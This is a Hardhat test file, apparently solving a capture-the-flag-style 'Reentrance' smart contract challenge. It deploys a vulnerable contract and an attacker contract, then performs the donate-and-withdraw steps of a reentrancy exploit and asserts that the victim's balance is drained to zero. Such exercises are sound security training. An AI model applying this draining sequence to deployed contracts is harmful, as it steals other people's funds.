import { expect } from "chai";
import { ethers } from "hardhat";
const { parseEther } = ethers.utils

describe("Reentrance", async function () {

  it("Should steal all the funds", async function () {
    //+setup
    const [deployer, attacker] = await ethers.getSigners()
    const Reentrance = await ethers.getContractFactory("Reentrance");
    const reentrance = await Reentrance.deploy();
    await reentrance.deployed();

    await deployer.sendTransaction({ to: reentrance.address, value: parseEther("0.001") })
    //-setup


    //1.Deploy the attacker
    const ReentranceAttacker = await ethers.getContractFactory("ReentranceAttacker");
    const reentranceAttacker = await ReentranceAttacker.connect(attacker).deploy(reentrance.address);
    await reentranceAttacker.deployed();

    //2.Retrieve Reentrance balance 
    const balance = await ethers.provider.getBalance(reentrance.address)

    //3.Donate the same amount as the balance
    await reentrance.connect(attacker).donate(reentranceAttacker.address, { value: balance })

    //4.Call withdraw from the attacker
    await reentranceAttacker.callWithdraw(balance)

    expect(await ethers.provider.getBalance(reentrance.address)).to.eq(0)


  });
});